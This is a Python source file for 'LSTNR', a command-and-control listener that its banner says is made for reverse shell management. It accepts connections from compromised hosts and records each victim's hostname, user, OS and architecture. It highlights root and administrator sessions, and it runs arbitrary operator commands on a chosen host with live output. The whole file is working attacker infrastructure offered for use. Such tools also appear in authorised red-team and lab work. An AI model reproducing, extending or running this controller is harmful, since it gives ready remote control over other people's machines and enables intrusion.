import socket
import threading
import readline
import sys
import signal
import time

RED = "\033[91m"
GREEN = "\033[92m"
BLUE = "\033[94m"
ORANGE = "\033[38;5;214m"
PINK = "\033[95m"
PURPLE = "\033[35m"
YELLOW = "\033[93m"
BROWN = "\033[33m"
WHITE = "\033[97m"
RESET = "\033[0m"

clients = []
addresses = []
session_map = {}  # session_id -> index
next_session_id = 1
server_running = True
current_session = None
in_session = False
session_info = {}  # session_id -> (hostname, username)

MAIN_COMMANDS = ["help", "list", "select", "die", "exit"]
SESSION_COMMANDS = ["background", "die"]

def main_menu_completer(text, state):
    options = [cmd + " " for cmd in MAIN_COMMANDS if cmd.startswith(text)]
    return options[state] if state < len(options) else None

def session_completer(text, state):
    options = [cmd + " " for cmd in SESSION_COMMANDS if cmd.startswith(text)]
    return options[state] if state < len(options) else None

def signal_handler(sig, frame):
    global in_session
    if in_session:
        print("\n[*] Backgrounding session.")
        raise KeyboardInterrupt
    else:
        print(f"\nType {RED}'exit'{RESET} to stop {BLUE}LSTNR{RESET}")

signal.signal(signal.SIGINT, signal_handler)

def rebuild_session_map():
    global session_map
    new_map = {}
    idx = 0
    for sid in sorted(session_map):
        if session_map[sid] < len(clients):
            new_map[sid] = idx
            idx += 1
    session_map.clear()
    session_map.update(new_map)

def send_command(client, cmd):
    try:
        client.settimeout(5)  # Set timeout to avoid hang
        client.send(cmd.encode() + b"\n")
        data = b""
        while True:
            part = client.recv(4096)
            if not part:
                break
            data += part
            if len(part) < 4096:
                break
        return data.decode(errors="ignore")
    except socket.timeout:
        return "Error: Command timed out."
    except Exception as e:
        return f"Error sending command: {e}"

def send_command_live(client, cmd):
    try:
        client.settimeout(None)  # Remove timeout for long-running commands
        client.send(cmd.encode() + b"\n")
        
        buffer = b""
        
        while True:
            data = client.recv(4096)
            if not data:
                break  # Connection closed

            buffer += data

            # Check if __END__ marker is in the buffer
            if b"__END__" in buffer:
                parts = buffer.split(b"__END__")
                lines = parts[0].splitlines()
                for line in lines:
                    print(line.decode(errors="ignore"))
                break
            else:
                # If no __END__, print full lines from buffer
                lines = buffer.split(b"\n")
                for line in lines[:-1]:  # All lines except last (incomplete)
                    print(line.decode(errors="ignore"))
                buffer = lines[-1]  # Keep the last incomplete line for next data
        
    except Exception as e:
        print(f"Error during live output: {e}")


def session_shell(client, session_id):
    global current_session, in_session
    in_session = True
    readline.set_completer(session_completer)
    readline.parse_and_bind("tab: complete")
    while True:
        try:
            hostname, username, *_ = session_info.get(session_id, ("unknown_host", "unknown_user"))

            # Set color based on user privilege
            if username.lower() in ["root", "administrator", "system"]:
                prompt_color = RED
            else:
                prompt_color = GREEN

            prompt = f"{prompt_color}{username}@{hostname}> {RESET}"
            cmd = input(prompt).strip()

            if cmd == "":
                continue
            elif cmd == "background":
                print("[*] Backgrounding session.")
                break
            elif cmd == "die":
                print(f"[*] Sending {RED}'die'{RESET} to session {session_id}")
                try:
                    client.send(b"die\n")
                    time.sleep(0.5)
                    client.close()
                except:
                    pass
                if session_id in session_map:
                    idx = session_map[session_id]
                    try:
                        del clients[idx]
                        del addresses[idx]
                        del session_info[session_id]
                    except IndexError:
                        pass
                    del session_map[session_id]
                    rebuild_session_map()
                break
            else:
                send_command_live(client, cmd)

        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error: {e}")
            break
    current_session = None
    in_session = False
    readline.set_completer(main_menu_completer)

def accept_connections(server_socket):
    global next_session_id
    while server_running:
        try:
            client, address = server_socket.accept()
            client.settimeout(10)  # optional, protects handler during initial handshake
            clients.append(client)
            addresses.append(address)
            session_map[next_session_id] = len(clients) - 1

            # Receive hostname and username
            info = client.recv(4096).decode().strip()
            if info:
                parts = info.split(",", 5)
                hostname = parts[0] if len(parts) > 0 else "Unknown"
                username = parts[1] if len(parts) > 1 else "Unknown"
                os_name = parts[2] if len(parts) > 2 else "Unknown"
                version = parts[3] if len(parts) > 3 else "Unknown"
                arch = parts[4] if len(parts) > 4 else "Unknown"
                session_info[next_session_id] = (hostname, username, os_name, version, arch)
            next_session_id += 1
        except Exception:
            break

def send_die_to_all():
    print(f"[*] Sending {RED}'die'{RESET} command to all clients!")
    for client in clients:
        try:
            send_command_live(client, "die")
            client.close()
        except:
            pass

def print_sessions_table(session_map, addresses, session_info):
    # Determine column widths based on content
    headers = ["ID", "IP", "HOSTNAME", "USER", "OS", "VERSION", "ARCH"]
    columns = {header: len(header) for header in headers}

    # Update column sizes based on data
    for sid in sorted(session_map):
        idx = session_map[sid]
        if idx < len(addresses):
            addr = addresses[idx]
            hostname, username, os_name, version, arch = session_info.get(sid, ("Unknown", "Unknown", "Unknown", "Unknown", "Unknown"))
            columns["ID"] = max(columns["ID"], len(str(sid)))
            columns["IP"] = max(columns["IP"], len(addr[0]))
            columns["HOSTNAME"] = max(columns["HOSTNAME"], len(hostname))
            columns["USER"] = max(columns["USER"], len(username))
            columns["OS"] = max(columns["OS"], len(os_name))
            columns["VERSION"] = max(columns["VERSION"], len(version))
            columns["ARCH"] = max(columns["ARCH"], len(arch))

    # Build table header
    border_top = "╔" + "╦".join(["═" * (columns[h] + 2) for h in headers]) + "╗"
    header_row = "║ " + " ║ ".join([h.ljust(columns[h]) for h in headers]) + " ║"
    border_mid = "╠" + "╬".join(["═" * (columns[h] + 2) for h in headers]) + "╣"
    border_bottom = "╚" + "╩".join(["═" * (columns[h] + 2) for h in headers]) + "╝"

    print(WHITE + border_top)
    print(header_row)
    print(border_mid)

    for sid in sorted(session_map):
        idx = session_map[sid]
        if idx < len(addresses):
            addr = addresses[idx]
            hostname, username, os_name, version, arch = session_info.get(sid, ("Unknown", "Unknown", "Unknown", "Unknown", "Unknown"))

            # Color usernames if they are sensitive accounts
            if any(word in username.lower() for word in ["admin", "administrator", "system", "root"]):
                username_display = f"{RED}{username:<{columns['USER']}}{RESET}"
            else:
                username_display = f"{GREEN}{username:<{columns['USER']}}{RESET}"

            row = "║ " + " ║ ".join([
                str(sid).ljust(columns["ID"]),
                addr[0].ljust(columns["IP"]),
                hostname.ljust(columns["HOSTNAME"]),
                username_display,
                os_name.ljust(columns["OS"]),
                version.ljust(columns["VERSION"]),
                arch.ljust(columns["ARCH"]),
            ]) + " ║"
            print(row)
    print(border_bottom + RESET)

def menu_shell():
    global current_session
    readline.set_completer(main_menu_completer)
    readline.parse_and_bind("tab: complete")
    while True:
        try:
            cmd = input(f"{BLUE}LSTNR> {RESET}").strip()
            if cmd == "":
                continue
            elif cmd == "help" or cmd == "?":
                print(f"""
{ORANGE}Menu commands:{RESET}
    list          - List sessions
    select <id>   - Connect to a session by its ID
    die           - Terminate all sessions
    exit          - Terminate all sessions and exit LSTNR
{ORANGE}Session commands:{RESET}
    <any command> - Execute command on client
    background    - Return to main menu
    die           - Terminate current session
                """)
            elif cmd == "list" or cmd == "ls":
                print_sessions_table(session_map, addresses, session_info)
            elif cmd.startswith("select"):
                try:
                    sid = int(cmd.split()[1])
                    if sid not in session_map or session_map[sid] >= len(clients):
                        print("Invalid session ID")
                        continue
                    current_session = clients[session_map[sid]]
                    print(f"[*] Connected to session {sid}")
                    session_shell(current_session, sid)
                except Exception as e:
                    print(f"Error: {e}")
            elif cmd == "die":
                send_die_to_all()
                clients.clear()
                addresses.clear()
                session_map.clear()
            elif cmd == "exit":
                send_die_to_all()
                print(f"[*] Exiting {BLUE}LSTNR{RESET}.")
                break
            else:
                print(f"Unknown command. Type {ORANGE}'help'{RESET} for options.")
        except KeyboardInterrupt:
            print(f"\nType {RED}'exit'{RESET} to stop {BLUE}LSTNR{RESET}")
        except Exception as e:
            print(f"Error: {e}")

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--port", type=int, required=True, help="Port to listen on")
    args = parser.parse_args()

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_socket.bind(("0.0.0.0", args.port))
        server_socket.listen(5)
        print(f""" {PINK}
██╗     ███████╗████████╗███╗   ██╗██████╗ 
██║     ██╔════╝╚══██╔══╝████╗  ██║██╔══██╗
██║     ███████╗   ██║   ██╔██╗ ██║██████╔╝
██║     ╚════██║   ██║   ██║╚██╗██║██╔══██╗
███████╗███████║   ██║   ██║ ╚████║██║  ██║
╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
    Remote Command & Control - v0.7
    - MADE FOR REVERSE SHELL MANAGEMENT{RESET}
        """)
        print(f"[+] Listening on {ORANGE}0.0.0.0:{args.port}{RESET}")
    except Exception as e:
        print(f"Failed to bind: {e}")
        sys.exit(1)

    t = threading.Thread(target=accept_connections, args=(server_socket,), daemon=True)
    t.start()

    menu_shell()
    server_socket.close()

if __name__ == "__main__":
    main()
